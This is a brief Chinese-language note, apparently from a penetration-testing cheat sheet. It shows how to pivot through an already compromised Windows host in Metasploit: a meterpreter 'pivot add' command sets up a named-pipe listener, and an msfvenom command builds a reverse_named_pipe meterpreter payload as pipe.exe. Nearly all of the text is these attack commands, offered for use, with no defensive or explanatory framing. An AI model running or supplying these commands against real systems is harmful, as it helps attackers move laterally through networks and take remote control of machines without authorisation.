	在已经获得meterpreter的机器上配置管道监听器
	meterpreter > pivot add -t pipe -l 已控IP -n bgpipe -a x86 -p windows
	生成
	>msfvenom -p windows/meterpreter/reverse_named_pipe PIPEHOST=已控IP PIPENAME=bgpipe -f exe -o pipe.exe.
